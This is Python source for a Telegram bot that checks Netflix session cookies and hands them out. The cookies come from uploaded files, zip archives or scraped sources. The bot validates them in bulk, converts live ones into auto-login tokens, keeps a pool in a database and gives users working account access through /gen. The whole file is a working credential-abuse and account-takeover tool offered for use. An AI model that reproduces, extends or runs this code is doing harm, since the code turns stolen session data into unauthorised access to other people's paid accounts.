    wait = check_cooldown(user_id)
    if wait > 0:
        bot.send_message(chat_id, f"⏳ Cooldown: <b>{wait:.1f}s</b>", parse_mode="HTML")
        return

    log.step(f"/gen by {first_name or 'User'} ({user_id})")
    start_time = time.time()
    lmsg = bot.send_message(chat_id, "⏳ <b>Fetching Cookie...</b>", parse_mode="HTML")
    loader = LoadingAnimation(bot, chat_id, lmsg.message_id, "⏳ <b>Fetching Cookie...</b>")
    loader.start()

    try:
        cookie_entry = db_get_live_cookie()
        if not cookie_entry:
            loader.stop()
            kb = tbt.InlineKeyboardMarkup()
            kb.add(tbt.InlineKeyboardButton("⬅️ Back to Menu", callback_data="hub_home"))
            bot.edit_message_text(
                "⚠️ <b>No cookies available!</b>\n\nThe pool is currently empty of LIVE accounts.",
                chat_id, lmsg.message_id, parse_mode="HTML", reply_markup=kb
            )
            return

        dicts = extract_cookies(cookie_entry["cookie_string"])
        cookie_dict = dicts[0] if dicts else None
        if not cookie_dict:
            loader.stop()
            kb = tbt.InlineKeyboardMarkup()
            kb.add(tbt.InlineKeyboardButton("⬅️ Back to Menu", callback_data="hub_home"))
            bot.edit_message_text(
                "❌ <b>Error.</b> Could not parse the retrieved cookie.",
                chat_id, lmsg.message_id, parse_mode="HTML", reply_markup=kb
            )
            return

        res = check_cookie(cookie_dict, generate_token_flag=True)
        kb = tbt.InlineKeyboardMarkup()
        kb.add(tbt.InlineKeyboardButton("⬅️ Back to Menu", callback_data="hub_home"))

        if not res["success"] or not res["info"]:
            db_update_status(cookie_entry["id"], "DEAD")
            loader.stop()
            bot.edit_message_text(
                "❌ <b>Dead Cookie Found.</b>\n\nPlease try /gen again.",
                chat_id, lmsg.message_id, parse_mode="HTML", reply_markup=kb
            )
            return

        increment_gen(user_id)
        log_interaction(user_id, "GEN_SUCCESS", True)
        elapsed = (time.time() - start_time) * 1000
        log.ok(f"GEN ALIVE — elapsed: {fmt_ms(elapsed)}")

        details = format_account_info_html(res["info"])
        out = "✅ <b>SUCCESS</b>\n\n"
        if details:
            out += f"{details}\n\n"
        if res["token"]:
            out += f"🔑 <b>Auto-Login Token:</b>\n<code>{esc(res['token'])}</code>\n\n"
        else:
            out += f"<i>⚠️ Failed to generate auto-login token, but the account works.</i>\n\n"
            out += f"🍪 <b>Raw Cookie:</b>\n<code>{esc(cookie_entry['cookie_string'])}</code>\n\n"
        out += f"⏱ {fmt_ms(elapsed)}"

        loader.stop()
        try:
            bot.edit_message_text(out, chat_id, lmsg.message_id, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass

    except Exception as e:
        loader.stop()
        kb = tbt.InlineKeyboardMarkup()
        kb.add(tbt.InlineKeyboardButton("⬅️ Back to Menu", callback_data="hub_home"))
        try:
            bot.edit_message_text(
                f"⚠️ Error: {esc(str(e))}",
                chat_id, lmsg.message_id, parse_mode="HTML", reply_markup=kb
            )
        except Exception:
            pass


@bot.message_handler(commands=["gen"])
def cmd_gen(msg: tbt.Message):
    process_gen(msg.chat.id, msg.from_user.id,
                msg.from_user.username, msg.from_user.first_name)


# ─── /chk ─────────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["chk"])
def cmd_chk(msg: tbt.Message):
    raw = msg.text or ""
    # strip /chk
    raw_input = re.sub(r'^/chk(?:@\w+)?', '', raw).strip()
    handle_check(msg.chat.id, msg.from_user.id,
                 msg.from_user.username, msg.from_user.first_name, raw_input)


def handle_check(chat_id: int, user_id: int, username: str, first_name: str, cookie_string: str):
    if require_approval(bot, chat_id, user_id):
        return

    if not cookie_string:
        bot.send_message(
            chat_id,
            "⚠️ No cookie provided.\n\nUsage:\n"
            "<code>/chk NetflixId=xxx</code>\n"
            "<code>/chk NetflixId=xxx; SecureNetflixId=xxx</code>",
            parse_mode="HTML"
        )
        return

    ensure_user(user_id, username, first_name)
    wait = check_cooldown(user_id)
    if wait > 0:
        bot.send_message(chat_id, f"⏳ Cooldown: <b>{wait:.1f}s</b>", parse_mode="HTML")
        return

    cookies_list = extract_cookies(cookie_string)
    if not cookies_list:
        bot.send_message(chat_id, "⚠️ No valid Netflix cookies found.\nRequired: <code>NetflixId</code>", parse_mode="HTML")
        return

    cookie_dict = cookies_list[0]
    cnt = sum(1 for v in cookie_dict.values() if v)
    log.step(f"/chk by {first_name or 'User'} ({user_id}) — {cnt} cookies")

    lmsg = bot.send_message(chat_id, f"⏳ <b>Checking {cnt} Cookies...</b>", parse_mode="HTML")
    loader = LoadingAnimation(bot, chat_id, lmsg.message_id, f"⏳ <b>Checking {cnt} Cookies...</b>")
    loader.start()
    start_time = time.time()

    try:
        res = check_cookie(cookie_dict, generate_token_flag=True)
        elapsed = (time.time() - start_time) * 1000
        log_interaction(user_id, "CHK", res["success"])

        loader.stop()
        if res["success"]:
            log.ok(f"CHECK ALIVE — {res['info'].get('plan','?')} | {res['info'].get('country','??')} | {fmt_ms(elapsed)}")
            details = format_account_info_html(res["info"])
            if res["token"]:
                token_line = f"\n\n🔑 <b>Auto-Login Token:</b>\n<code>{esc(res['token'])}</code>\n"
            elif res["info"].get("membershipStatus") == "FORMER_MEMBER":
                token_line = "\n\n🔑 <b>Auto-Login Token:</b>\n❌ Skipped (Inactive Account)"
            else:
                token_line = "\n\n🔑 <b>Auto-Login Token:</b>\n❌ Generation Failed"

            text = f"✅ <b>SUCCESS</b>\n{chr(10) + details if details else ''}{token_line}\n\n⏱ {fmt_ms(elapsed)}"
            try:
                bot.edit_message_text(text, chat_id, lmsg.message_id, parse_mode="HTML",
                                      disable_web_page_preview=True)
            except Exception:
                pass
        else:
            log.fail(f"CHECK DEAD — {res['error']} | {fmt_ms(elapsed)}")
            try:
                bot.edit_message_text(
                    f"❌ <b>DEAD</b> | {esc(res['error'] or 'Unknown')}\n\n⏱ {fmt_ms(elapsed)}",
                    chat_id, lmsg.message_id, parse_mode="HTML"
                )
            except Exception:
                pass
    except Exception as e:
        elapsed = (time.time() - start_time) * 1000
        loader.stop()
        try:
            bot.edit_message_text(
                f"⚠️ <b>Error:</b> {esc(str(e))}\n⏱ {fmt_ms(elapsed)}",
                chat_id, lmsg.message_id, parse_mode="HTML"
            )
        except Exception:
            pass


# ─── /batch ────────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["batch"])
def cmd_batch(msg: tbt.Message):
    chat_id = msg.chat.id
    user_id = msg.from_user.id
    if require_approval(bot, chat_id, user_id):
        return
    ensure_user(user_id, msg.from_user.username, msg.from_user.first_name)

    # If replied to a document, process immediately
    if msg.reply_to_message and msg.reply_to_message.document:
        threading.Thread(
            target=process_batch_file,
            args=(chat_id, user_id, msg.reply_to_message.document),
            daemon=True
        ).start()
        return

    batch_mode_users.add(user_id)
    bot.send_message(
        chat_id,
        "📦 <b>Batch Mode</b>\n\nUpload a file or reply to one with /batch\n\n"
        "<b>Supported:</b> <code>.txt</code> <code>.json</code> <code>.zip</code>\n"
        "<b>Max size:</b> 20 MB",
        parse_mode="HTML"
    )


def process_batch_file(chat_id: int, user_id: int, doc):
    if require_approval(bot, chat_id, user_id):
        return

    filename = doc.file_name or "unknown"
    user = ensure_user(user_id)

    if (doc.file_size or 0) > MAX_FILE_BYTES:
        bot.send_message(
            chat_id,
            f"❌ File too large. Max: {MAX_FILE_BYTES // 1024 // 1024}MB",
            parse_mode="HTML"
        )
        return

    try:
        file_info = bot.get_file(doc.file_id)
        file_bytes = bot.download_file(file_info.file_path)

        all_cookies = []
        if filename.endswith(".zip"):
            with zipfile.ZipFile(io.BytesIO(file_bytes)) as zf:
                entries = [e for e in zf.namelist()
                           if e.endswith(".txt") or e.endswith(".json")]
                if not entries:
                    bot.send_message(chat_id, "❌ No .txt/.json files found in zip.", parse_mode="HTML")
                    return
                for entry in entries:
                    content = zf.read(entry).decode("utf-8", errors="ignore")
                    for d in extract_cookies(content):
                        all_cookies.append({"source": entry, "cookies": d})
        elif filename.endswith((".txt", ".json")):
            content = file_bytes.decode("utf-8", errors="ignore")
            for d in extract_cookies(content):
                all_cookies.append({"source": filename, "cookies": d})
        else:
            bot.send_message(chat_id, "❌ Unsupported file type.\n<i>Accepted: .txt, .json, .zip</i>", parse_mode="HTML")
            return

        if not all_cookies:
            bot.send_message(chat_id, "❌ No valid Netflix cookies found in file.", parse_mode="HTML")
            return

        log.step(f"BATCH — {filename} | {len(all_cookies)} cookies | user {user_id}")

        batch_id = f"b_{int(time.time())}_{user_id}"
        active_batches[batch_id] = True

        kb = tbt.InlineKeyboardMarkup()
        kb.add(tbt.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_batch:{batch_id}"))

        pmsg = bot.send_message(
            chat_id,
            f"🔍 <b>Batch Checking...</b>\n\n📁 {esc(filename)} | {len(all_cookies)} cookies\n"
            f"<code>{progress_bar(0, len(all_cookies))}</code>\nStarting...",
            parse_mode="HTML", reply_markup=kb
        )

        results = []
        total = len(all_cookies)
        batch_start = time.time()
        last_update = 0.0

        for i, item in enumerate(all_cookies):
            if not active_batches.get(batch_id):
                log.warn(f"BATCH CANCELLED — {filename} | {user_id}")
                break

            t0 = time.time()
            res = check_cookie(item["cookies"], batch_mode=True, generate_token_flag=True)
            elapsed_item = (time.time() - t0) * 1000
            log_interaction(user_id, "BATCH_ITEM", res["success"])

            results.append({
                "source":       item["source"],
                "index":        i + 1,
                "success":      res["success"],
                "cookies":      item["cookies"],
                "info":         res["info"] if res["success"] else None,
                "infoText":     format_account_info_plain(res["info"]) if res["success"] else None,
                "error":        res["error"] if not res["success"] else None,
                "timeMs":       elapsed_item,
                "token":        res["token"] if res["success"] else None,
            })

            now_ts = time.time()
            if (i + 1) % 5 == 0 or i == total - 1 or now_ts - last_update > 3:
                last_update = now_ts
                alive_n = sum(1 for r in results if r["success"])
                dead_n = len(results) - alive_n
                elapsed_total = (now_ts - batch_start) * 1000
                try:
                    bot.edit_message_text(
                        f"🔍 <b>Batch Checking...</b>\n\n📁 {esc(filename)}\n"
                        f"<code>{progress_bar(i + 1, total)}</code>\n"
                        f"{i+1}/{total} • ✅ {alive_n} ❌ {dead_n} • ⏱ {fmt_ms(elapsed_total)}",
                        chat_id, pmsg.message_id, parse_mode="HTML"
                    )
                except Exception:
                    pass

        active_batches.pop(batch_id, None)
        was_cancelled = len(results) < total
        total_time = (time.time() - batch_start) * 1000
        alive_count = sum(1 for r in results if r["success"])
        dead_count = len(results) - alive_count
        skipped = total - len(results)
        alive_rate = round(alive_count / max(len(results), 1) * 100)

        log.ok(f"ALIVE {alive_count} | DEAD {dead_count} | {filename} | {user_id}")

        try:
            bot.edit_message_text(
                f"📊 <b>BATCH COMPLETE</b>{'  (STOPPED 🛑)' if was_cancelled else ''}\n\n"
                f"📁 {esc(filename)}\n"
                f"✅ Alive: {alive_count}\n❌ Dead: {dead_count}\n"
                + (f"⏭ Skipped: {skipped}\n" if was_cancelled else "")
                + f"📝 Total: {len(results)} checked ({alive_rate}%)\n⏱ {fmt_ms(total_time)}",
                chat_id, pmsg.message_id, parse_mode="HTML"
            )
        except Exception:
            pass

        # Build result file
        lines = [
            "NETFLIX COOKIE CHECK RESULTS",
            "============================",
            f"Generated : {datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')}",
            f"File      : {filename}",
            f"Alive     : {alive_count}",
            f"Dead      : {dead_count}",
            f"Skipped   : {skipped}",
            f"Finished  : {'NO (Cancelled)' if was_cancelled else 'YES'}",
            f"Time      : {fmt_ms(total_time)}",
            "",
        ]
        alive_results = [r for r in results if r["success"]]
        if alive_results:
            lines += ["--- ALIVE COOKIES ---", ""]
            for r in alive_results:
                lines.append(f"[#{r['index']}] ALIVE ✅")
                lines.append(r["infoText"] or "")
                if r["token"]:
                    lines.append(f"Token: {r['token']}")
                elif r.get("info", {}).get("membershipStatus") == "FORMER_MEMBER":
                    lines.append("Token: ❌ Skipped (Inactive Account)")
                else:
                    lines.append("Token: ❌ Generation Failed")
                lines.append(f"Cookie: {_build_cookie_str(r['cookies'])}")
                lines.append("")

        dead_results = [r for r in results if not r["success"]]
        if dead_results:
            lines += ["--- DEAD COOKIES ---", ""]
            for r in dead_results:
                lines.append(f"[#{r['index']}] DEAD ❌")
                lines.append(f"Error: {r['error']}")
                lines.append(f"Cookie: {_build_cookie_str(r['cookies'])}")
                lines.append("")

        result_bytes = "\n".join(lines).encode("utf-8")
        bot.send_document(
            chat_id,
            result_bytes,
            caption="📋 Results",
            visible_file_name=f"results_{date_stamp()}.txt",
        )

    except Exception as e:
        log.error(f"Batch error: {e}")
        bot.send_message(chat_id, f"❌ Error: {esc(str(e))}", parse_mode="HTML")


# ─── Document handler ─────────────────────────────────────────────────────────
@bot.message_handler(content_types=["document"])
def handle_document(msg: tbt.Message):
    chat_id = msg.chat.id
    user_id = msg.from_user.id

    # Admin upload mode
    if user_id == ADMIN_ID and user_id in upload_mode_users:
        upload_mode_users.discard(user_id)
        doc = msg.document
        if not doc:
            return
        fname = doc.file_name or "unknown"
        if not fname.endswith(".txt"):
            bot.send_message(chat_id, "❌ Only `.txt` files are supported.", parse_mode="HTML")
            return

        lmsg = bot.send_message(chat_id, "⏳ <b>Downloading file...</b>", parse_mode="HTML")
        try:
            fi = bot.get_file(doc.file_id)
            data = bot.download_file(fi.file_path)
            text = data.decode("utf-8", errors="ignore")
            extracted = extract_cookies(text)

            if not extracted:
                bot.edit_message_text("❌ No valid cookies parsed.", chat_id, lmsg.message_id, parse_mode="HTML")
                return

            bot.edit_message_text(
                f"⏳ <b>Inserting {len(extracted)} cookies into DB...</b>",
                chat_id, lmsg.message_id, parse_mode="HTML"
            )
            payload = [{"cookie_string": _build_cookie_str(d), "source": "Manual TXT Upload"} for d in extracted]
            inserted = db_insert_cookies(payload)

            bot.edit_message_text(
                f"✅ <b>Upload Complete</b>\n\n"
                f"📁 File: <code>{esc(fname)}</code>\n"
                f"🔍 Parsed: <b>{len(extracted)}</b>\n"
                f"📝 Saved: <b>{inserted}</b> new (Skipped {len(extracted) - inserted} duplicates)",
                chat_id, lmsg.message_id, parse_mode="HTML"
            )
        except Exception as e:
            try:
                bot.edit_message_text(f"❌ <b>Error:</b> {esc(str(e))}", chat_id, lmsg.message_id, parse_mode="HTML")
            except Exception:
                pass
        return

    # Batch mode
    if user_id in batch_mode_users:
        batch_mode_users.discard(user_id)
        ensure_user(user_id, msg.from_user.username, msg.from_user.first_name)
        threading.Thread(
            target=process_batch_file,
            args=(chat_id, user_id, msg.document),
            daemon=True
        ).start()
    else:
        bot.send_message(chat_id, "💡 Tip: Reply to this file with /batch", parse_mode="HTML")


# ─── Callbacks ─────────────────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda q: True)
def handle_callback(query: tbt.CallbackQuery):
    data    = query.data or ""
    user_id = query.from_user.id
    msg     = query.message

    # Hub: gen
    if data == "hub_gen":
        bot.answer_callback_query(query.id)
        try:
            bot.delete_message(msg.chat.id, msg.message_id)
        except Exception:
            pass
        dummy = type("M", (), {
            "chat":      type("C", (), {"id": msg.chat.id})(),
            "from_user": query.from_user,
        })()
        process_gen(msg.chat.id, user_id, query.from_user.username, query.from_user.first_name)
        return

    if data == "hub_chk_help":
        bot.answer_callback_query(query.id)
        text = (
            "🔍 <b>How to Check & Tokenize</b>\n\n"
            "Checking cookies is <b>FREE</b> and unlimited.\n\n"
            "<b>1. Single Cookie:</b>\n"
            "Send <code>/chk &lt;cookie_string&gt;</code>\n\n"
            "<b>2. Multiple Cookies:</b>\n"
            "Send a text file (.txt) with cookies to the bot, then reply to it with <code>/batch</code>"
        )
        kb = tbt.InlineKeyboardMarkup()
        kb.add(tbt.InlineKeyboardButton("⬅️ Back to Hub", callback_data="hub_home"))
        try:
            bot.edit_message_text(text, msg.chat.id, msg.message_id, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
        return

    if data == "hub_home":
        bot.answer_callback_query(query.id)
        send_hub(msg.chat.id, user_id, query.from_user, msg.message_id)
        return

    # Access approve / deny
    approve_m = re.match(r'^access_approve_(\d+)$', data)
    if approve_m:
        if user_id != ADMIN_ID:
            bot.answer_callback_query(query.id, text="⛔ Not authorized")
            return
        target = int(approve_m.group(1))
        approve_user(target)
        try:
            bot.edit_message_text(
                f"✅ <b>Approved user</b> <code>{target}</code>",
                msg.chat.id, msg.message_id, parse_mode="HTML"
            )
        except Exception:
            pass
        bot.answer_callback_query(query.id, text="✅ Approved!")
        try:
            bot.send_message(
                target,
                "🎉 <b>ACCESS APPROVED!</b>\n\nYou have been approved to use the bot.\nType /start to begin.",
                parse_mode="HTML"
            )
        except Exception:
            pass
        return

    deny_m = re.match(r'^access_deny_(\d+)$', data)
    if deny_m:
        if user_id != ADMIN_ID:
            bot.answer_callback_query(query.id, text="⛔ Not authorized")
            return
        target = int(deny_m.group(1))
        try:
            bot.edit_message_text(
                f"❌ <b>Denied user</b> <code>{target}</code>",
                msg.chat.id, msg.message_id, parse_mode="HTML"
            )
        except Exception:
            pass
        bot.answer_callback_query(query.id, text="Denied")
        try:
            bot.send_message(target, "❌ Your access request was denied.", parse_mode="HTML")
        except Exception:
            pass
        return

    # Batch stop
    if data.startswith("stop_batch:"):
        batch_id = data.split(":", 1)[1]
        if active_batches.get(batch_id):
            active_batches[batch_id] = False
            bot.answer_callback_query(query.id, text="🛑 Stopping batch early...", show_alert=True)
        else:
            bot.answer_callback_query(query.id, text="⚠️ Batch is already stopped or finished.")
        return

    bot.answer_callback_query(query.id)


# ─── Admin Commands ────────────────────────────────────────────────────────────
@bot.message_handler(commands=["cmd"])
def cmd_admin_help(msg: tbt.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    bot.send_message(
        msg.chat.id,
        "🔐 <b>Admin Commands Guide</b> (Tap to copy)\n\n"
        "<code>/approve &lt;uid&gt;</code> - Approve user access\n"
        "<code>/source</code> - Scrape & verify new cookies into DB\n"
        "<code>/health</code> - Verify all LIVE & UNCHECKED cookies in DB\n"
        "<code>/purge_dead</code> - Clean up DEAD cookies from DB\n"
        "<code>/stats</code> - Bot statistics\n"
        "<code>/upload</code> - Bulk upload cookies from TXT to DB\n"
        "<code>/allusers</code> - List all users\n"
        "<code>/broadcast &lt;msg&gt;</code> - Message all users\n",
        parse_mode="HTML"
    )


@bot.message_handler(commands=["approve"])
def cmd_approve(msg: tbt.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    m = re.match(r'^/approve\s+(\d+)$', msg.text or "")
    if not m:
        bot.send_message(msg.chat.id, "Usage: /approve <uid>")
        return
    target = int(m.group(1))
    approve_user(target)
    log.ok(f"Admin approved {target}")
    bot.send_message(msg.chat.id, f"✅ Approved user <code>{target}</code>", parse_mode="HTML")
    try:
        bot.send_message(
            target,
            "🎉 <b>ACCESS APPROVED!</b>\n\nType /start to begin.",
            parse_mode="HTML"
        )
    except Exception:
        pass


@bot.message_handler(commands=["allusers"])
def cmd_allusers(msg: tbt.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    users = get_all_users()
    log.info(f"/allusers — {len(users)} users")
    if not users:
        bot.send_message(msg.chat.id, "<i>No users registered yet.</i>", parse_mode="HTML")
        return
    lines = []
    for i, u in enumerate(users):
        name = u.get("first_name") or u.get("username") or str(u["user_id"])
        lines.append(f"  {i+1}. {esc(name)} (<code>{u['user_id']}</code>)")
    bot.send_message(
        msg.chat.id,
        f"👥 <b>All Users</b>\n\n{chr(10).join(lines)}\n\n<i>{len(users)} total</i>",
        parse_mode="HTML"
    )


@bot.message_handler(commands=["stats"])
def cmd_stats(msg: tbt.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    s = get_global_stats()
    alive_rate  = round(s["aliveChecks"] / max(s["totalChecks"], 1) * 100)
    today_rate  = round(s["todayAlive"]  / max(s["todayChecks"],  1) * 100)
    bot.send_message(
        msg.chat.id,
        f"📈 <b>Bot Statistics</b>\n\n"
        f"👥 Users: {s['totalUsers']}\n"
        f"🔍 Total Checks: {s['totalChecks']}\n"
        f"✅ Alive: {s['aliveChecks']} ({alive_rate}%)\n"
        f"📅 Today:\n"
        f"• {s['todayChecks']} checks\n"
        f"• {s['todayAlive']} alive ({today_rate}%)",
        parse_mode="HTML"
    )


@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(msg: tbt.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    m = re.match(r'^/broadcast\s+(.+)$', msg.text or "", re.DOTALL)
    if not m:
        bot.send_message(msg.chat.id, "Usage: /broadcast <message>")
        return
    text = m.group(1).strip()
    users = get_all_users()
    sent = 0
    for u in users:
        try:
            bot.send_message(u["user_id"], f"📢 <b>Announcement</b>\n\n{esc(text)}", parse_mode="HTML")
            sent += 1
        except Exception:
            pass
    bot.send_message(msg.chat.id, f"✅ Broadcast sent to <b>{sent}/{len(users)}</b> users.", parse_mode="HTML")


@bot.message_handler(commands=["upload"])
def cmd_upload(msg: tbt.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    upload_mode_users.add(msg.from_user.id)
    bot.send_message(
        msg.chat.id,
        "📂 <b>Upload Cookies</b>\n\nPlease send a <code>.txt</code> file containing Netflix cookies.",
        parse_mode="HTML"
    )


@bot.message_handler(commands=["purge_dead"])
def cmd_purge(msg: tbt.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    count = db_purge_dead()
    bot.send_message(msg.chat.id, f"🗑️ Purged <b>{count}</b> DEAD cookies.", parse_mode="HTML")


@bot.message_handler(commands=["health"])
def cmd_health(msg: tbt.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    chat_id = msg.chat.id
    lmsg = bot.send_message(chat_id, "⏳ <b>Database Health Check...</b>", parse_mode="HTML")
    loader = LoadingAnimation(bot, chat_id, lmsg.message_id, "⏳ <b>Database Health Check...</b>")
    loader.start()

    def run():
        try:
            batch = db_get_cookies_for_health()
            if not batch:
                loader.stop()
                try:
                    bot.edit_message_text(
                        "✅ <b>Health Check Complete</b>\n\nNo cookies to check.",
                        chat_id, lmsg.message_id, parse_mode="HTML"
                    )
                except Exception:
                    pass
                return

            live_count = dead_count = 0
            for item in batch:
                dicts = extract_cookies(item["cookie_string"])
                if not dicts:
                    db_update_status(item["id"], "DEAD")
                    dead_count += 1
                    continue
                res = check_cookie(dicts[0])
                if res["success"]:
                    db_update_status(item["id"], "LIVE")
                    live_count += 1
                else:
                    db_update_status(item["id"], "DEAD")
                    dead_count += 1

            stats = db_get_stats()
            loader.stop()
            try:
                bot.edit_message_text(
                    f"✅ <b>Health Check Complete</b>\n\n"
                    f"🔍 Processed {len(batch)} cookies.\n"
                    f"🛡️ <b>Live:</b> {live_count}\n"
                    f"💀 <b>Dead:</b> {dead_count}\n\n"
                    f"📊 <b>Pool Status:</b>\n"
                    f"  - Unchecked: {stats['unchecked']}\n"
                    f"  - Live: {stats['live']}\n"
                    f"  - Dead: {stats['dead']}",
                    chat_id, lmsg.message_id, parse_mode="HTML"
                )
            except Exception:
                pass
        except Exception as e:
            loader.stop()
            try:
                bot.edit_message_text(
                    f"❌ <b>Health Check Failed</b>\n\n{esc(str(e))}",
                    chat_id, lmsg.message_id, parse_mode="HTML"
                )
            except Exception:
                pass

    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["source"])
def cmd_source(msg: tbt.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    chat_id = msg.chat.id
    lmsg = bot.send_message(chat_id, "⏳ <b>Scraping Sources...</b>", parse_mode="HTML")
    loader = LoadingAnimation(bot, chat_id, lmsg.message_id, "⏳ <b>Scraping Sources...</b>")
    loader.start()

    def run():
        try:
            raw = scrape_pool()
            parsed_valid = []
            for text in raw:
                for d in extract_cookies(text):
                    cs = _build_cookie_str(d)
                    if cs:
                        parsed_valid.append({"cookie": cs, "dict": d})

            # De-dupe
            seen, unique = set(), []
            for item in parsed_valid:
                if item["cookie"] not in seen:
                    seen.add(item["cookie"])
                    unique.append(item)

            import concurrent.futures
            live_cookies = []

            def _chk(item):
                res = check_cookie(item["dict"])
                if res["success"]:
                    return {"cookie_string": item["cookie"], "source": "secure-source", "status": "LIVE"}
                return None

            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
                futs = {ex.submit(_chk, item): item for item in unique}
                for f in concurrent.futures.as_completed(futs):
                    r = f.result()
                    if r:
                        live_cookies.append(r)

            inserted = db_insert_cookies(live_cookies)
            stats = db_get_stats()
            loader.stop()
            try:
                bot.edit_message_text(
                    f"✅ <b>Background Source Complete</b>\n\n"
                    f"📥 Sourced {len(unique)} unique cookies.\n"
                    f"🛡️ <b>Verified</b> {len(live_cookies)} were working!\n"
                    f"🔄 <b>Upserted</b> {inserted} into database.\n\n"
                    f"📊 <b>Cookie Pool Status:</b>\n"
                    f"  - Unchecked: {stats['unchecked']}\n"
                    f"  - Live: {stats['live']}\n"
                    f"  - Dead: {stats['dead']}",
                    chat_id, lmsg.message_id, parse_mode="HTML"
                )
            except Exception:
                pass
        except Exception as e:
            loader.stop()
            try:
                bot.edit_message_text(f"❌ <b>Source Failed</b>\n\n{esc(str(e))}", chat_id, lmsg.message_id, parse_mode="HTML")
            except Exception:
                pass

    threading.Thread(target=run, daemon=True).start()


# ─── Entry Point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN is not set in .env")
    log.init(f"NFToken Bot starting — Admin ID: {ADMIN_ID}")

    # Commands visible to all users
    user_commands = [
        tbt.BotCommand("start", "Open Interactive Hub"),
        tbt.BotCommand("gen",   "Get a live Netflix cookie"),
        tbt.BotCommand("chk",   "Check a Netflix cookie"),
        tbt.BotCommand("batch", "Batch check cookies from file"),
    ]
    bot.set_my_commands(user_commands)

    # Extra commands visible only in the admin chat
    admin_commands = user_commands + [
        tbt.BotCommand("cmd",        "Admin commands guide"),
        tbt.BotCommand("source",     "Scrape & insert new cookies"),
        tbt.BotCommand("health",     "Verify all cookies in DB"),
        tbt.BotCommand("purge_dead", "Remove dead cookies from DB"),
        tbt.BotCommand("stats",      "Bot statistics"),
        tbt.BotCommand("upload",     "Bulk upload cookies from TXT"),
        tbt.BotCommand("allusers",   "List all users"),
        tbt.BotCommand("broadcast",  "Send message to all users"),
        tbt.BotCommand("approve",    "Approve a user"),
    ]
    try:
        bot.set_my_commands(
            admin_commands,
            scope=tbt.BotCommandScopeChat(chat_id=ADMIN_ID)
        )
    except Exception as e:
        log.warn(f"Could not set admin command scope: {e}")

    log.ok("Bot is polling...")
    bot.infinity_polling(timeout=30, long_polling_timeout=20)
